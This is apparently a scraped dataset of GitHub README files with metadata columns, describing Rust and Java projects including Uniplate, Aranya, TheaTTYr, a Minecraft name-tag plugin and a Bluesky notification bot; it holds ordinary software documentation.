[vcdm]: https://www.w3.org/TR/vc-data-model-2.0/
[vci]: https://openid.net/specs/openid-4-verifiable-credential-issuance-1_0-ID1.html
[vp]: https://openid.net/specs/openid-4-verifiable-presentations-1_0-ID2.html
",0,0,1,Apache-2.0,,0.0
conjure-cp/uniplate,main,"# Uniplate

**Uniplate helps you write simple, boilerplate-free operations on tree shaped
data types.**

It is a port of the Haskell library [Uniplate](https://hackage.haskell.org/package/uniplate) into Rust.

----

Quick links:

* [Installing Uniplate from crates.io](https://crates.io/crates/uniplate/0.1.4)
* [Documentation (docs.rs)](https://docs.rs/uniplate/0.1.4)
* [Github Repository](https://github.com/conjure-cp/uniplate)

## A simple example

*Adapted from (Mitchell and Runciman 2007)*

Uniplate makes the traversal and querying of tree shaped data easy and
boilerplate free. A good use case of Uniplate is the manipulation of abstract
syntax trees.

Consider the AST for a simple calculator language:

```rust
enum Expr {
    Add(Box<Expr>, Box<Expr>),
    Sub(Box<Expr>, Box<Expr>),
    Mul(Box<Expr>, Box<Expr>),
    Div(Box<Expr>, Box<Expr>),
    Val(i32),
    Var(String),
    Neg(Box<Expr>),
}
```

Say we want to list all the variable names used inside a given expression:
                                                                                               
```rust
fn vars_names(expr: &Expr) -> Vec<String>{
    match expr {
        Add(a,b) => {
            [vars(a),vars(b)].concat()
        },
        Sub(a,b) => {
            [vars(a),vars(b)].concat()
        },
        Mul(a,b) => {
            [vars(a),vars(b)].concat()
        },
        Div(a,b) => {
            [vars(a),vars(b)].concat()
        },
        Val(a) => {
            Vec::new()
        },
        Var(a) => {
            vec![a.clone()]
        },
        Neg(a) =>{
            vars(a)
        }
    }
}
```

Functions like these are annoying to write: the first 4 constructors are
basically identical, adding a new expression type requires a new line to be
added to all match statement, and this code cannot be shared with similar
functions (e.g. one that change all the variable names).

With Uniplate, this boilerplate can be eliminated:

```rust
use uniplate::{Uniplate,Biplate};
use uniplate::derive::Uniplate;
#[derive(Clone,PartialEq,Eq,Debug,Uniplate)]
#[uniplate()]
#[biplate(to=String)]
enum Expr {
    Add(Box<Expr>, Box<Expr>),
    Sub(Box<Expr>, Box<Expr>),
    Mul(Box<Expr>, Box<Expr>),
    Div(Box<Expr>, Box<Expr>),
    Val(i32),
    Var(String),
    Neg(Box<Expr>),
}

fn vars_names(expr: &Expr) -> Vec<String>{
    <Expr as Biplate<String>>::universe_bi(expr).into_iter().collect()
}
```


Uniplate also supports trees with multiple recursive types. Lets extend our
calculator language to include statements as well as expressions:

```rust
enum Expr {
    Add(Box<Expr>, Box<Expr>),
    Sub(Box<Expr>, Box<Expr>),
    Mul(Box<Expr>, Box<Expr>),
    Div(Box<Expr>, Box<Expr>),
    Val(i32),
    Var(String),
    Neg(Box<Expr>),
}

enum Stmt {
    Assign(String, Expr),
    Sequence(Vec<Stmt>),
    If(Expr, Box<Stmt>, Box<Stmt>),
    While(Expr, Box<Stmt>),
}
```


When looking for variable names in a given statement, we want to identify not
only the variable names directly used inside the statement, but also any
variable names used by child expressions.


```rust
use uniplate::{Uniplate,Biplate};
use uniplate::derive::Uniplate;
#[derive(Clone,PartialEq,Eq,Debug,Uniplate)]
// look for strings inside expressions as well as statements 
#[biplate(to=String,walk_into=[Expr])]
#[biplate(to=Expr)]
#[uniplate()]
enum Stmt {
    Assign(String, Expr),
    Sequence(Vec<Stmt>),
    If(Expr, Box<Stmt>, Box<Stmt>),
    While(Expr, Box<Stmt>),
}

#[derive(Clone,PartialEq,Eq,Debug,Uniplate)]
#[biplate(to=String])]
#[uniplate()]
enum Expr {
    Add(Box<Expr>, Box<Expr>),
    Sub(Box<Expr>, Box<Expr>),
    Mul(Box<Expr>, Box<Expr>),
    Div(Box<Expr>, Box<Expr>),
    Val(i32),
    Var(String),
    Neg(Box<Expr>),
}

fn vars_names(stmt: &Stmt) -> Vec<String>{
    <Stmt as Biplate<String>>::universe_bi(stmt).into_iter().collect()
}

```

Despite having to recursively look through multiple types, this operation is
no harder to write!


## Acknowledgements

This library is inspired by Neil Mitchell's Haskell library
[Uniplate](https://hackage.haskell.org/package/uniplate) and its accompanying
paper: *Neil Mitchell and Colin Runciman. 2007. Uniform boilerplate and list
processing*.


",5,7,1,MPL-2.0,"format.yml,test.yml,warnings.yaml",15.0
aranya-project/aranya,main,"# Aranya

Aranya is lovingly crafted and supported by [SpiderOak](https://spideroak.com). Aranya is licensed under the [AGPL](LICENSE.md)- if you want to use it commercially, drop us a line!

## What is it?

Aranya is a software development tool for governing access to data and services over a decentralized, zero-trust framework with secure end-to-end encrypted data exchange built-in.

Aranya has been designed with an emphasis on security, efficiency, and portability.

The root cause of cyber insecurity is complexity; and yet when we attempt to protect our systems, our solution is to add more.

Software developers must not expect customers to mitigate defects using external security tools and an endless cycle of patching. Software must become secure by design.

Aranya is our contribution to this effort. It is a batteries-included tool which allows developers to produce software with built-in micro-segmentation. This complete solution covers access management with user onboarding, authentication and authorization, freeing the developer to focus on the problem they wish to solve.

For users, software built on Aranya is less complex to operate securely, and is secure regardless of the network it is run on.

More documentation on Aranya is provided here:
- [Aranya Overview](docs/overview.md)
- [Getting Started With Aranya](docs/walkthrough.md)


## Getting Started

Install Rust:
<https://www.rust-lang.org/tools/install>

Download the source code from this repository or from [crates.io](https://crates.io):
- [client](https://crates.io/crates/aranya-client)
- [daemon](https://crates.io/crates/aranya-daemon)

Integrate the [client](crates/aranya-client) library into your application. The
[client's README](crates/aranya-client/README.md) has more information on using
the Rust client.

The [daemon's README](crates/aranya-daemon/README.md) contains instructions for
configuring and running the daemon.

After the daemon has started up, start the application.

## What's Contained In This Repo

This repository contains the following components:
- [Rust Client Library](crates/aranya-client)
- [Daemon Process](crates/aranya-daemon)
- [Aranya Policy](crates/aranya-daemon/src/policy.md)

### Rust Client Library

The [Rust Client Library](crates/aranya-client/) provides an interface for your
application to interface with the
[Aranya Daemon](crates/aranya-daemon-api/src/service.rs) in order to invoke
actions on and process affects from the Aranya graph. The library also provides
an interface to [Aranya Core](https://github.com/aranya-project/aranya-core)
for Aranya Fast Channels functionality. Refer to the
[client's README](crates/aranya-client/README.md) for more details on this
component.

### Daemon Process

The [daemon](crates/aranya-daemon/) is a long-running process that forwards
requests from the [client](crates/aranya-client) to the
[Aranya Core](https://github.com/aranya-project/aranya-core). Refer to the
[daemon's README](crates/aranya-daemon/README.md) for more information on
this component.

### Aranya Policy

The [Aranya Policy](crates/aranya-daemon/src/policy.md) is a security control policy written in Aranya's domain-specific policy language and executed by the Aranya runtime.

## Dependencies

### Aranya Core

The [Aranya Core](https://github.com/aranya-project/aranya-core) repo has all the main components of Aranya that are needed for the core functionality to work. This is a library that includes the storage module (for DAG and FactDB), crypto module (with default crypto engine automatically selected), sync engine, and runtime client (including policy VM).

### Aranya Fast Channels

[Aranya Fast Channels](https://github.com/aranya-project/aranya-core/tree/main/crates/aranya-fast-channels) are encrypted channels between 2 peers that could be either bidirectional or unidirectional.

## Maintainers

This repository is maintained by software engineers employed at [SpiderOak](https://spideroak.com/)
",2,5,8,AGPL-3.0,"build.yml,correctness.yml,doc.yml,publish.yml,security.yml,tests.yml",16.0
orhun/theattyr,main,"## TheaTTYr üé•

A terminal theater for playing [VT100 art and animations](http://artscene.textfiles.com/vt100).

> [!NOTE]  
> The [VT100](https://en.wikipedia.org/wiki/VT100), introduced by DEC in 1978, was among the first video terminals to support ANSI escape codes.
>
> The ANSI art scene used the VT100's animation capabilities, made possible by codes that allowed cursor movement, deletion, and character updates to create animated effects.
>
> Usually, they represent a long hand-crafted process done by a single person to tell a story. Some of these files may date back to the 1960's and 1970's.

> [!TIP]  
> I developed this tool over a series of livestreams, which you can check out [here](https://www.youtube.com/watch?v=_tXCDBFAXNg&list=PLxqHy2Zr5TiWif_1QOB-uAVfPUNdGqWQh).

### Installation

#### Cargo üì¶

```shell
cargo install theattyr
```

### Usage

Simply run `theattyr` and browse the terminal movies!

![demo](demo/theattyr-demo-shaders.gif)

The demo above uses [RetroArch shaders](https://raphamorim.io/rio/docs/features/retroarch-shaders/) for additional nostalgia!

![demo1](demo/theattyr-demo1.gif)

![demo2](demo/theattyr-demo2.gif)

Or you can specify a file at the start via e.g. `theattyr fireworks.vt`:

![demo3](demo/theattyr-demo3.gif)

- Press <kbd>Tab</kbd> to hide the sidebar.
- You can specify a FPS value via `--fps` argument. Run `theattyr --help` for other options.

### List of Animations

See <http://artscene.textfiles.com/vt100/>

<details>
<summary>Details</summary>

| File              | Description                                                      |
| ----------------- | ---------------------------------------------------------------- |
| bambi.vt          | Bambi vs. Godzilla                                               |
| bambi_godzila     | Bambi Versus Godzilla, from Dave Brett                           |
| barney.vt         | Barney Being Crushed by a Rock                                   |
| beer.vt           | Time for a Beer Break, Folks!                                    |
| bevis.butthead.vt | Beavis and Butthead                                              |
| blinkeyes.vt      | Blinking Eyes                                                    |
| bomb.vt           | The Bomb Test                                                    |
| bugsbunny.vt      | Bugs Bunny: That's All, Folks                                    |
| cartwhee.vt       | Doing a Cartwheel                                                |
| castle.vt         | Disney's Fantasy in the Sky, by Don Bertino                      |
| cert18.vt         | Make Money Fast: The Revenge, by GtB (1993)                      |
| cow.vt            | Exploding Cow, Hauled off by U-Mass Food Service                 |
| cowboom.vt        | Cow Explodes, Gets Hauled Off                                    |
| crash.vt          | Shuttle Blows Up                                                 |
| cursor.vt         | Cursor Control Examples in VT100                                 |
| delay.vt          | A Small Delay                                                    |
| demo.vt           | Alan's Impressive Demonstration                                  |
| dirty.vt          | Someone Having an Awful Amount of Fun                            |
| dogs.vt           | Fucking Dogs                                                     |
| dont-wor.vt       | George Custer's Last Stand: Don't Worry, be Happy                |
| dontworry.vt      | Man Being Shot with Arrows: Don't Worry, Be Happy                |
| duckpaint.vt      | Duck Painting                                                    |
| firework.vt       | Fireworks by Chen Lin                                            |
| fireworks.vt      | Guy Setting Off Fireworks                                        |
| fishy-fishy.vt    | 3-D Fishy Fishy                                                  |
| fishy.vt          | Fish Swimming By, Glug Glug                                      |
| fishy2.vt         | Shamus the Fish by David Rybolt (1994)                           |
| flatmap.vt        | Shifting Flat World Map                                          |
| frogs.vt          | Hopping Frog                                                     |
| glass.vt          | Filling Glass of Liquid                                          |
| globe.vt          | ABSOLUTELY EXCELLENT Spinning Globe                              |
| hallow.vt         | Happy Halloween                                                  |
| hello.vt          | HELLO!                                                           |
| juanspla.vt       | Plan File in the Form of a Typewriter                            |
| july.4.vt         | July 4th Animation                                               |
| jumble.vt         | Now Is the Time for All Good Men                                 |
| maingate.vt       | The Disneyland Main Gate, by Don Bertino                         |
| mark_twain.vt     | The Mark Twain Ferry, by Don Bertino                             |
| monkey.vt         | The Monkey Gives You The Finger                                  |
| monorail.vt       | Disneyland's Monorail, by Don Bertino                            |
| moon.animation    | Winking Moon Says Good Evening                                   |
| movglobe.vt       | Incredible Spinning, Moving Globe                                |
| mr_pumpkin        | Happy Halloween Pumpkin by Mike Kamlet                           |
| nasa.vt           | NASA: Keep Reaching for the Stars, by A.J.L.                     |
| new_year.vt       | Happy New Year to You                                            |
| newbeer.vt        | Working on a VT100                                               |
| nifty.vt          | Small Animated Word NIFTY                                        |
| outerlimits.vt    | The Outer Limits                                                 |
| pac3d.vt          | Pac Man in 3-D Chomping a Ghost                                  |
| paradise.vt       | A Bomb in Paradise by Gonad the Barbarian                        |
| peace.vt          | Imagine World Peace by John G. Poupore                           |
| prey.vt           | Klingon Bird of Prey                                             |
| prey_col.vt       | Klingon Bird of Prey                                             |
| safesex.vt        | Safe Sex (Literally)                                             |
| shuttle.vt        | Technology, Who Needs It                                         |
| skyway.vt         | Disneyland's Skyway, by Don Bertino                              |
| snowing           | Merry Christmas from Woodrow                                     |
| snowing.vt        | Tis the Season: Merry Christmas                                  |
| spinweb.vt        | Spinning Web by R.L. Samuell (April 6, 1994)                     |
| sship.vt          | Space Ship Warps and Fires                                       |
| startrek.vt       | Star Trek Enterprise Blows up Politically Correct New Enterprise |
| strike.vt         | Bowling a Strike                                                 |
| sun.vt            | A Happy Sun                                                      |
| surf.vt           | Surfing Wave (In 3-D)                                            |
| tetris.vt         | Tetris Game                                                      |
| tomorrw.vt        | Disneyland's Tomorrowland, by Don Bertino                        |
| torturet.vt       | VT100 FONT: The VT-100 Torture Test by Joe Smith (May 8, 1985)   |
| treadmill.vt      | The Treadmill, by GtB Productions (1993)                         |
| trek.vt           | The Enterprise Blows up an RCA Satellite                         |
| trekvid.vt        | Politically Incorrect Star Trek                                  |
| turkey.vt         | Happy Thanksgiving                                               |
| tv.vt             | The Outer Limits Television Show                                 |
| twilight.vt       | The Twilight Zone                                                |
| twilightzone.vt   | Twilight Zone Opener                                             |
| valentin.vt       | Happy Valentine's Day, Beth and Dave                             |
| valentine.vt      | Happy Valentine's Day, Jane and Chris                            |
| van_halen.vt      | Van Halen's Song 5150, Animated                                  |
| wineglas.vt       | Wine Glass Filling                                               |
| xmas-00.vt        | Santa Holds Moving Sign: Merry Christmas, Happy New Year         |
| xmas-01.vt        | Merry Christmas                                                  |
| xmas-02.vt        | Bird Flies By, Tree Grows, Merry Christmas                       |
| xmas-03.vt        | Merry Christmas (Tree, Train, Presents)                          |
| xmas-04.vt        | Merry Christmas, Champagne Glass Filling, Jack-in-the-Box        |
| xmas-05.vt        | Happy Holidays, Starry Night, Christmas Tree, by Peter           |
| xmas-06.vt        | Merry Christmas: Hearth and Tree                                 |
| xmas-07.vt        | A Christmas Card: Merry Christmas, from MIS                      |
| xmas-08.vt        | Christmas Eve, 1992 (1992)                                       |
| xmas-09.vt        | Merry Christmas: Reindeer Land on Roof                           |
| xmas.large        | Compilation of Several Christmas Animations                      |
| xmas.vt           | Merry Christmas                                                  |
| xmas2.vt          | Large Collection of Christmas Animations                         |
| xmasshort.vt      | Merry Christmas, Tree, Train, Present                            |
| zorro.vt          | The Story of Zorro by Cian O'Kiersey                             |

</details>

## License

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat&logo=GitHub)](./LICENSE-MIT)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg?style=flat&logo=GitHub)](./LICENSE-APACHE)

Licensed under either of [Apache License Version 2.0](./LICENSE-APACHE) or [The MIT License](./LICENSE-MIT) at your option.

ü¶Ä „Éé( ¬∫ \_ ¬∫ „Éé) - respect crables!

## Copyright

Copyright ¬© 2024, [Orhun Parmaksƒ±z](mailto:orhunparmaksiz@gmail.com)
",8,0,2,Apache-2.0,"ci.yml,dist.yml,release.yml",2.0
Matt-MX/DisplayNameTags,main,"<div>

<h1 align=""center"">üè∑Ô∏è Display Name Tags</h1>

</div>

Replace your players' boring old name tags with customizable ones based on 
text displays! (Thanks to [EntityLib](https://github.com/Tofaa2/EntityLib)!)


<p align=""center"">
    <img width=""650px"" src=nametags.gif />
</p>


## Configuration

Currently, you can customize default name tags and create grouped name tags.

Install the plugin and access the `plugins/NameTags/config.yml` for more information.

## API

Designed primarily for developers, the NameTags api gives you lightweight yet
powerful control over how the plugin operates.

You can override default behaviours using the `setDefaultProvider` method, and
the [NameTagEntityCreateEvent](./src/main/java/com/mattmx/nametags/event/NameTagEntityCreateEvent.java)
to hook into a tag's creation. You can add your own features using the 
[Trait](./src/main/java/com/mattmx/nametags/entity/trait/Trait.java) api.

```java

public void onEnable() {
    NameTags nameTags = NameTags.getInstance();
    
    // Override the default ""base"" settings of a tag.
    nameTags.getEntityManager()
        .setDefaultProvider((entity, meta) -> {
            meta.setText(Component.text(entity.getName()));
            /* ... */
        });
}

```

Here is an example where we can add an Item Display above the player's name tag
by using the `Trait` system.

```java

class MyCustomTrait extends Trait {
    // TODO create example by putting an ItemStack above a name tag.
    
    @Override
    public void onDisable() {
        // Clean up stuff
    }
}

class MyCustomListener implements Listener {
    
    @EventHandler
    public void onTagCreate(@NotNull NameTagEntityCreateEvent event) {
        if (!event.getBukkitEntity().getName().equals(""MattMX"")) return;
        
        event.getTraits().getOrAddTrait(MyCustomTrait.class, MyCustomTrait::new);
    }
    
}

```

<details>
    <summary>Kotlin example</summary>

Here is a brief example of Kotlin usage, and shows that you can use the nametags on entities other than just Players!

In this example, a dropped item will display a timer of 4 seconds before it is removed from the world, with a timer above it!

```kt
@EventHandler
fun onItemSpawn(event: ItemSpawnEvent) = event.apply {
    entity.isPersistent = false

    // Armour and tools should take longer to despawn
    val ticksTillRemove = 80 // 4 seconds

    val nameTagEntity = NameTags.getInstance()
        .entityManager
        .getOrCreateNameTagEntity(entity)

    nameTagEntity.modify { meta ->
        meta.isShadow = true
        meta.viewRange = 90f
        meta.backgroundColor = NameTags.TRANSPARENT
        meta.translation = Vector3f(0f, 0.45f, 0f)
        meta.billboardConstraints = AbstractDisplayMeta.BillboardConstraints.VERTICAL
        meta.textOpacity = (-180).toByte()
    }

    var counter = ticksTillRemove / 20L
    val update = runAsyncRepeat(20) {
        counter--
        nameTagEntity.modify { meta ->
            meta.text = Component.text(counter.toString()).color(NamedTextColor.RED)
        }
    }

    runSyncLater(ticksTillRemove) {
        update?.cancel()

        NameTags.getInstance()
            .entityManager
            .removeEntity(entity)
            ?.destroy()

        if (entity.isValid) {
            entity.remove()
        }
    }
}
```
    
</details>

## Roadmap

- `/feat/rel_placeholders`
    Currently the plugin does not support PlaceholderAPI's
    relational placeholders.

- `/feat/customization`
    Extension plugin to give players ability to customize their own
    name tags by using a command and customizable GUI interface.
",3,7,2,MIT,"build-and-archive.yml,build.yml",15.0
oestradiol/bsky-post-notifs-bot,main,"# Bluesky Watcher Bot - Post Notification Watcher

Follow me on Bluesky!
- [return Ok(elaina);](https://bsky.app/profile/elynn.bsky.social)

## Summary

Here's a summary of what this README.md covers. I tried to be as comprehensive as possible, to help both end users and anyone that wants to self-host this.

#### For End Users:

The only relevant section is probably [2.1 How to Use](#21-how-to-use). So you might as well just skip to that.

#### For maintainers, self-hosters, contributors:

I recommend reading the entire readme, or whatever sections below might help you. It covers all of the important aspects, really. The code is also properly documented, and I tried to make the variables self-explanatory for clarity, too.

**Table of Contents**

- [1. Special Thanks](#1-special-thanks)
- [2. Overall Description](#2-overall-description)
  - [2.1 How to Use](#21-how-to-use)
- [3. Current Features](#3-current-features)
  - [3.1 Error Handling](#31-error-handling)
  - [3.2 TODOs](#32-todos)
- [4. Workspace Organization](#4-workspace-organization)
- [5. Running and Building](#5-running-and-building)
  - [5.1 Makefile](#51-makefile)
  - [5.2 Environment Variables](#52-environment-variables)
  - [5.3 Production Deployment](#53-production-deployment)
  - [5.4 Docker Deployment (untested)](#54-docker-deployment-untested)
- [6. Contributions](#6-contributions)
- [7. FAQ / Troubleshooting](#7-faq--troubleshooting)
- [8. Licensing](#8-licensing)

---

### 1. Special Thanks

Special thanks to [Yoshihiro Sugi](https://github.com/sugyan), the author of **ATrium**, a collection of Rust libraries designed to work with the AT Protocol. ATrium successfully provided a versatile and coherent ecosystem that made the development of this bot possible and smooth.

Deep appreciation for the dedication and continuous development of ATrium, and I am grateful for the ongoing improvements.
Yoshihiro-san also was quick to help me when I had issues with it, as you can see [in this closed issue](https://github.com/sugyan/atrium/issues/220).

---

### 2. Overall Description

This **Bluesky Bot**, named **Watcher**, is designed to subscribe to post notifications from users on Bluesky and notify listeners in real-time. Built using [ATrium](https://github.com/sugyan/atrium), Watcher tracks posts and replies by interacting with ATProto. It is capable of monitoring multiple users simultaneously and employs [Tokio](https://tokio.rs/) to manage tasks and threads efficiently. It also includes a logging system to track all events and operations.

For the self-hosters and maintainers, there is a Discord webhook opt-in for the logging system. If you use it, it sends real-time updates to the webhook, keeping you informed of important events, including failures and changes to the watchlist. [The level of the logs can be configured with an environment variable](#52-environment-variables).

The bot is designed with robust error resilience, including a retry mechanism for API failures, connection issues, and invalid user inputs. This ensures continuous operation even in the face of temporary disruptions.

### 2.1 How to Use

The Watcher is operated directly through the Bluesky platform. Users can interact with it by sending specific commands via direct message (DM) to manage which users they want to watch for post notifications.

#### Available Commands:

- `!watch @user_1.handle @user_2.handle (...)`: Add one or more users to your watchlist. The bot will notify you whenever these users post or reply to posts.
   - NOTICE: Currently, listening to replies is not really implemented, but the code is structured to allow for such feature. If you really want this, [feel free to contribute](#6-contributions)!
  
- `!unwatch @user_1.handle @user_2.handle (...)`: Remove one or more users from your watchlist, stopping notifications for their posts or replies.

- `!list_watched`: View a list of all users you are currently watching.

- `!help`: Displays the available commands and their usage.

Make sure you follow the bot or at least have DMs opened for everyone, or else it won't be able to contact you!

#### **Opting Out**

Respect for user privacy and consent is a core guideline for this. If you wish to opt out of notifications, you can simply block the bot on Bluesky. This action will prevent it from sending you any notifications, as well as watching you. Your decision will be respected immediately.

---

### 3. Current Features

The Watcher comes with a variety of features designed to provide efficient and reliable notifications for users. 

#### **Key Features:**

- **Post Notifications**: Subscribes to posts and replies from specified users and sends real-time updates to listeners.

- **Session Caching**: Caches sessions to reduce repeated authentication.

- **In-Memory Repository**: Implements an in-memory repository for fast concurrent access to the watchlist and notifications.

- **Sqlite Storage**: Utilizes Sqlite to cache the state, ensuring persistence across restarts. This allows the bot to recover its state and resume operations without losing data.

- **Logging System**: Tracks all significant events and operations, providing detailed logs for monitoring and debugging.

- **Discord Webhooks**: Optionally, integrates with Discord to notify a channel about updates, ensuring immediate awareness of important logs (errors, warnings).

- **Graceful Shutdown**: Ensures that the Sqlite database disconnects gracefully before shutdown, maintaining data integrity and preventing corruption. Also finishes sending all your Discord logs, if the feature is enabled.

### 3.1 Error Handling

The Watcher is designed to handle a range of errors and potential issues gracefully, ensuring minimal disruption to its functionality.

#### **API and Bluesky Errors**

- **Retry Mechanism**: Attempts to issue requests and handle errors by retrying up to [`PER_REQ_MAX_RETRIES`](https://github.com/oestradiol/bsky-post-notifs-bot/blob/main/src/other/bsky/lib.rs#L158). This helps prevent single failures from interrupting the workflow.

#### **ATrium Bugs**

- **Bug Handling**: Includes safeguards to manage potential bugs in the ATrium library. These are addressed as they occur.

#### **Database Errors**

- **Sqlite Robustness**: Sqlite is known for its robustness, so database errors are rare. However, any issues that do arise are handled with appropriate error logging.

#### **API Failures**

- If API failures occur, the bot will retry in incrementing intervals [(1s, up to `INCREMENTS_LIMIT`, for a maximum of `MINUTES_LIMIT`)](https://github.com/oestradiol/bsky-post-notifs-bot/blob/main/src/other/utils/handle_api_failure.rs#L6). This is to mitigate temporary issues and ensure continued operation.

#### **Bluesky Bugs**

- The bot is prepared to handle any possible Bluesky bugs. It should log those comprehensively, so that the hoster can ask for help and possibly [contribute to the project](https://github.com/bluesky-social/atproto).

#### **Other Errors**

- **Command Handling Failures**: Handles cached commands. Command failures are logged, but it does not notify the sender about the failure, as currently any command failure is caused by a failure in contacting the API, so it's contradictory to attempt to notify them anyways. This means that failed commands need to be reissued.

- **Command Listener Failures**: Listens for new commands and [fetches unread conversations periodically](https://github.com/oestradiol/bsky-post-notifs-bot/blob/main/src/other/services/jobs/command_listener.rs#L11). Failures are logged, and the job will cancel if the error is deemed unrecoverable. Persistent failures will cause it to stop listening for new commands.

- **Post Watching Failures**: Watching users' posts and notifying watchers is [done periodically](https://github.com/oestradiol/bsky-post-notifs-bot/blob/main/src/other/services/jobs/user_watcher.rs#L26). If failures occur, they are logged, and the job will cancel if the error is unrecoverable.
    * Ideally, this would be reworked to use the firehose (or jetstreams). Feel free to contribute!

#### **Panic Scenarios**

- **Signal Handlers**: Panics if signal handlers for SIGTERM/SIGINT fail to install. This is crucial for handling termination signals properly.

- **Environment Variables**: Panics if required environment variables are not found or fail to parse correctly. Ensure all necessary variables are defined and correctly formatted.

- **Database Initialization**: Panics if the connection pool fails to initialize. This occurs if there are issues with creating or connecting to the database file.

- **Logging System**: Panics if the logging system fails to initialize, usually due to issues with environment variable definitions for log directory and severity level.

**Note**: Most panics occur during the initial setup, often related to environment configuration issues. Once initialized, the bot is designed to handle errors robustly.

---

### 3.2 TODOs

The following features and improvements are planned for future development (if it does ever happen):

- **Analysing and implementing using the firehose/jetstreams**: It'd be better to do that instead of making individual requests every 15s to the API. However, ATrium doesn't yet have a client compatible with Event Streams, but there's a [PR made my me](https://github.com/sugyan/atrium/pull/228) to work on this.

- **`with_replies` feature**: [Develop the `posts_with_replies` filter](https://github.com/oestradiol/bsky-post-notifs-bot/blob/main/src/other/bsky/get_last_post_time.rs#L22) to distinguish between replies and regular posts. This will enhance notification management for users who also want to be notified for replies.

- **Rate Limiting**: Analyze how the ATProto APIs handle rate limiting and [implement a more robust solution](https://github.com/oestradiol/bsky-post-notifs-bot/blob/main/src/other/bsky/lib.rs#L183) to manage potential rate limits, if necessary.

- **Configuration for Invalid Messages and Unknown Commands**: Creating a configuration file for customizing the response message for invalid messages and unknown commands. Currently, the messages are hard-coded ([occurrence 1](https://github.com/oestradiol/bsky-post-notifs-bot/blob/main/src/other/services/commands/invalid.rs#L7), [occurrence 2](https://github.com/oestradiol/bsky-post-notifs-bot/blob/main/src/other/services/commands/unknown.rs#L7)).

---

### 4. Workspace Organization

The project workspace is organized as follows:

- **`src/app`**: Contains the main application logic and entry point for the bot.

- **`src/other/bsky`**: Includes modules specific to interactions with the Bluesky API.

- **`src/other/environment`**: Manages environment configuration and related utilities.

- **`src/other/repositories`**: Houses data repositories, including the Sqlite storage and in-memory cache.

- **`src/other/services`**: Contains various services used, such as command processing and notification handling.

- **`src/other/utils`**: Includes utility functions and helpers used across the project.

---

### 5. Running and Building

First, ensure you're using the correct version of Rust (1.81). Then, to run **Watcher**, follow the instructions below for different environments and setups.

#### 5.1 Makefile

The Makefile provides convenient commands for building, testing, and running. Available commands:

- **`make clean`**: Cleans up build artifacts and logs while keeping the `.env` file.
- **`make build`**: Builds and copies the executable and `.env` file to the `dist` directory.
- **`make lint`**: Runs the linter for the codebase.
- **`make lint-fix`**: Automatically fixes linting issues.
- **`make force-lint-fix`**: Forces linting fixes even for dirty or staged files.
- **`make dev`**: Runs in development mode with full span tracing and backtraces, while still respecting the `LOG_SEVERITY` environment variable.
- **`make prod`**: Builds and runs in production mode.

#### 5.2 Environment Variables

Watcher requires several environment variables to function correctly. Ensure at least the required ones (the ones that don't have a default value) are set in your `.env` file or your environment:

- **`LOG_SEVERITY`**: Defines the severity level for logging (defaults to `INFO`).
- **`LOG_DIRECTORY`**: Directory where log files are stored (defaults to `/var/log/post_watcher`).
- **`DATABASE_URL`**: URL for the database (defaults to `sqlite://data.db`).
- **`DB_CONN_POOL_MAX`**: Maximum number of database connections (defaults to `100`).
- **`DISCORD_WEBHOOK`**: The Discord Webhook URL (does not have a default value, however this feature will be disabled if undefined).
- **`BOT_USERNAME`**: The bot's username on Bluesky.
- **`BOT_PASSWORD`**: The bot's password or app password.
- **`TURN_OFF_WATCHED_NOTIFS`**: Setting this variable to anything will prevent the bot from sending notifications to a newly watched user that they are being watched. Will also not send notifications when the user is unwatched by all their watchers. The feature is on by default.

An example `.env` file is provided as `.env.example`.

#### 5.3 Production Deployment

For production deployment:

1. **Build Watcher**: Use `make build` to compile and prepare the executable.
2. **Run Watcher**: Navigate to the `dist` directory and execute `./app` to start.

Alternatively, you can run `make prod` to do both of the commands above at once.

After that, you can copy the `dist` directory wherever you prefer and delete the rest of the source code.

Ensure all environment variables are set correctly before running.

#### 5.4 Docker Deployment (untested)

NOTICE: This section and the corresponding Dockerfile are untested, but it _should_ hopefully work.

To deploy using Docker, follow these steps:

1. **Build the Docker Image**:

  ```bash
  docker build -t watch-bot .
  ```

2. **Run the Docker Container**:

  ```bash
  docker run -d --name watch-bot -e BOT_USERNAME=<your_username> -e BOT_PASSWORD=<your_password>
  ```

Make sure to replace `<your_username>` and `<your_password>` with your actual bot credentials.

---

### 6. Contributions

Contributions are welcome and encouraged! If you'd like to help enhance **Watcher**, please submit issues or pull requests on our GitHub repository. Your support is greatly appreciated!

---

### 7. FAQ / Troubleshooting

<details>
   <summary><b><i>What should I do if the bot is not sending notifications?</b></i></summary>
Check the logs for errors. Ensure it has the correct permissions and that the environment variables are properly set. Also make sure the receiver is following the bot, or has DMs opened, or else the bot cannot contact them.
</details>

<details>
   <summary><b><i>How can I check if it is properly connected to Bluesky?</b></i></summary>
Verify the authentication details and check the connection status in the logs. Make sure your credentials are correct.
</details>

<details>
   <summary><b><i>The bot crashed or stopped working. What should I do?</b></i></summary>
Review the logs for any critical errors or panics. Restart it and monitor for recurring issues. If the problem persists, consider reporting it on the GitHub repository.
</details>

<details>
   <summary><b><i>How can I update the bot to the latest version?</b></i></summary>
Pull the latest changes from the repository, rebuild it using `make build`, and redeploy it.
</details>

<details>
   <summary><b><i>The bot is not responding to commands, or receiving any at all. What could be wrong?</b></i></summary>
If you are an end user, contact the maintainer. If you are the maintainer, first, ensure that the bot account has DMs opened for anyone. You can do that in the settings of your Bluesky account. Then, ensure that the commands sent by the users are correctly formatted and that it is actively listening for new commands. Check the logs for any errors related to command processing.
</details>

<details>
   <summary><b><i>How do I opt out of notifications/being watched?</b></i></summary>
You can block it on Bluesky to opt out. The bot respects user privacy and will stop sending notifications and watching you if blocked.
</details>

For additional help, check the [GitHub issues](https://github.com/oestradiol/bsky-post-notifs-bot/issues) or make a new issue for support.

---

### 8. Licensing

This project is licensed under the **BSD 3-Clause New or Revised License**. 

- **Permissive Use**: Free to use, modify, and distribute.
- **Attribution**: Must retain copyright notice and disclaimers.
- **No Endorsement**: Cannot use project names or contributors' names for promotion without permission.
- **Patent Grant**: Includes an express patent grant.

For more details, see the [BSD 3-Clause License File](https://github.com/oestradiol/bsky-post-notifs-bot/blob/main/LICENSE).
",0,0,1,BSD-3-Clause,rust.yml,0.0
PyO3/pyo3-async-runtimes,main,"# PyO3 Asyncio

[![Actions Status](https://github.com/PyO3/pyo3-async-runtimes/workflows/CI/badge.svg)](https://github.com/PyO3/pyo3-async-runtimes)
